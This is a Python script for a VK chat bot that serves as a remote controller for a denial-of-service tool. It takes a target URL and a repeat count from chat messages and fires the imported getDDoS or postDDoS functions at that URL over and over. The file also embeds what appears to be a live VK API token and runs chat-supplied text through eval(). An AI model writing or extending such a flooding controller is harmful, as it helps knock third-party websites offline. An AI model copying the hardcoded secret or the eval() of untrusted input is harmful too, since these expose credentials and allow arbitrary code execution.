from vk_api import VkApi
from vk_api.utils import get_random_id
from vk_api.longpoll import VkLongPoll, VkEventType
from POSTGET import postDDoS, getDDoS

token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce'

vk_session = VkApi(token=token)
vk = vk_session.get_api()
longpoll = VkLongPoll(vk_session)



def message(message):
    vk.messages.send(
        peer_id = '300610283',
        message = message,
        random_id = get_random_id(),
    )

def secondDDoS():
    try:
        for event in longpoll.listen():
            if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                if event.text == 'Назад':
                    break
                elif event.text == 'Выход':
                    break
                elif event.text == 'GET':
                    for event in longpoll.listen():
                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                            if event.text == 'Назад':
                                break
                            elif event.text == 'Выход':
                                break
                            elif event.text != 'Назад':
                                url = event.text
                                for event in longpoll.listen():
                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                        if event.text == 'Назад':
                                            break
                                        elif event.text == 'Выход':
                                            break
                                        elif event.text != 'Назад':
                                            for i in range(int(event.text)):
                                                getDDoS(url)
                                            break
                elif event.text == 'POST':
                    for event in longpoll.listen():
                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                            if event.text == 'Назад':
                                break
                            elif event.text == 'Выход':
                                break
                            elif event.text == 'Выход':
                                break
                            elif event.text != 'Назад':
                                url = event.text
                                print(url)
                                for event in longpoll.listen():
                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                        if event.text == 'Назад':
                                            break
                                        elif event.text == 'Выход':
                                            break
                                        elif event.text != 'Назад':
                                            data = event.text
                                            dict = eval(data)
                                            for event in longpoll.listen():
                                                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                                    if event.text == 'Назад':
                                                        break
                                                    elif event.text == 'Выход':
                                                        break
                                                    elif event.text != 'Назад':
                                                        print(dict)
                                                        for i in range(int(event.text)):
                                                            postDDoS(url, dict)
                                                        break
    except:
        pass